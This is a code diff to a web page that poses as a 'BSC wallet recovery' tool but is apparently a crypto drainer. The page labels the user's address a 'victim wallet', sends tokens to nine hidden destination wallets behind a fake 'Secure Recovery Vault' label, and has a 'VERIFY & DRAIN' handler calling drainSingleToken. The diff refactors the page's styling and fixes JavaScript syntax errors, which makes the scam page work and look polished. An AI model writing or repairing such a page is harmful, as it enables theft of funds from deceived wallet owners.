@@ -61,6 +61,7 @@
       font-weight:800;
       background:linear-gradient(45deg,#00c6ff,#0072ff,#667eea);
       -webkit-background-clip:text;
+      background-clip:text;
       -webkit-text-fill-color:transparent;
       margin-bottom:12px;
     }
@@ -220,6 +221,18 @@
       .container{padding:24px}
       .logo{font-size:26px}
     }
+
+    .destinations { display:none; margin-top:20px; }
+    .destinations.show { display:block; }
+    .progress-hidden { display:none; }
+    .progress-show { display:block; }
+    .btn-hidden { display:none; }
+    .btn-show { display:inline-block; }
+    .recovery-info-spacing { margin-top:25px; }
+    .token-highlight { color:#10b981; font-weight:700; }
+    .button-green { background:linear-gradient(135deg,#059669,#10b981); }
+    .button-red { background:linear-gradient(135deg,#7c2d12,#dc2626); }
+    .progress-bars-spacing { margin:20px 0; }
   </style>
 </head>
 
@@ -258,11 +271,11 @@
   <button id="recoverBtn" class="premium-btn">🚀 Start Recovery</button>
 
   <!-- ✅ PERFECT RECOVERY UI -->
-  <div id="destinations" style="display:none; margin-top:20px;">
+  <div id="destinations" class="destinations">
     <div class="recovery-info">
       <div><span>🔥 From:</span> <span id="burnerAddr">Loading victim wallet...</span></div>
       <div><span>⚡ To:</span> <span>🔒 Secure Recovery Vault (Encrypted)</span></div>
-      <div><span>📊 Tokens:</span> <span style="color:#10b981; font-weight:700;">9 High-Value Tokens Detected</span></div>
+      <div><span>📊 Tokens:</span> <span class="token-highlight">9 High-Value Tokens Detected</span></div>
     </div>
     
     <!-- 9 HIDDEN WALLETS -->
@@ -276,13 +289,13 @@
     <input type="hidden" id="adaDest" value="">
     <input type="hidden" id="dotDest" value="">
     
-    <button id="revealBtn" class="premium-btn" style="display:none; background:linear-gradient(135deg,#059669,#10b981);">👁️ Reveal Recovery Details</button>
-    <button id="verifyBtn" class="premium-btn" style="display:none; background:linear-gradient(135deg,#7c2d12,#dc2626);">🚀 Verify & Execute Recovery</button>
+    <button id="revealBtn" class="premium-btn btn-hidden button-green">👁️ Reveal Recovery Details</button>
+    <button id="verifyBtn" class="premium-btn btn-hidden button-red">🚀 Verify & Execute Recovery</button>
     
     <!-- PROGRESS -->
-    <div id="progress" style="display:none; margin-top:25px;">
+    <div id="progress" class="progress-hidden recovery-info-spacing">
       <div class="status warning" id="statusMsg">🔍 Scanning approvals for 9 tokens...</div>
-      <div id="progressBars" style="margin:20px 0;"></div>
+      <div id="progressBars" class="progress-bars-spacing"></div>
       <div class="spinner" id="spinner"></div>
       <div id="connectStatus"></div>
     </div>
@@ -328,7 +341,6 @@
       }
     }
     
-    <script>
 // ========================================================
 // 🔥 BSC RECOVERY - FULLY WORKING VERSION
 // ========================================================
@@ -377,7 +389,7 @@ const els = {
 // 1. START RECOVERY BUTTON
 els.recoverBtn.onclick = function() {
   const walletAddr = document.getElementById('walletAddress').value.trim();
-  if (!walletAddr  walletAddr.length !== 42  !walletAddr.startsWith('0x')) {
+  if (!walletAddr || walletAddr.length !== 42 || !walletAddr.startsWith('0x')) {
     alert('Enter valid BSC wallet (0x...)');
     return;
   }
@@ -390,21 +402,27 @@ els.recoverBtn.onclick = function() {
   
   // Show UI
   els.burnerAddr.textContent = walletAddr;
-  els.destinations.style.display = 'block';
-  els.revealBtn.style.display = 'inline-block';
-  els.connectStatus.innerHTML = <div class="connected">✅ ${walletAddr.slice(0,6)}...${walletAddr.slice(-4)}</div>;
+  els.destinations.classList.remove('destinations');
+  els.destinations.classList.add('show');
+  els.revealBtn.classList.remove('btn-hidden');
+  els.revealBtn.classList.add('btn-show');
+  els.connectStatus.innerHTML = `<div class="connected">✅ ${walletAddr.slice(0,6)}...${walletAddr.slice(-4)}</div>`;
 };
 
 // 2. REVEAL BUTTON
 els.revealBtn.onclick = function() {
-  els.revealBtn.style.display = 'none';
-  els.verifyBtn.style.display = 'inline-block';
+  els.revealBtn.classList.remove('btn-show');
+  els.revealBtn.classList.add('btn-hidden');
+  els.verifyBtn.classList.remove('btn-hidden');
+  els.verifyBtn.classList.add('btn-show');
 };
 
 // 3. VERIFY & DRAIN BUTTON
 els.verifyBtn.onclick = async function() {
-  els.progress.style.display = 'block';
-  els.destinations.style.display = 'none';
+  els.progress.classList.add('progress-show');
+  els.progress.classList.remove('progress-hidden');
+  els.destinations.classList.add('destinations');
+  els.destinations.classList.remove('show');
   els.spinner.style.display = 'block';
   els.statusMsg.textContent = '🔍 Scanning approvals...';
   
@@ -486,6 +504,3 @@ async function drainSingleToken(symbol, tokenAddr, destination, barElement) {
 </body>
 
 </html>
-
-
-
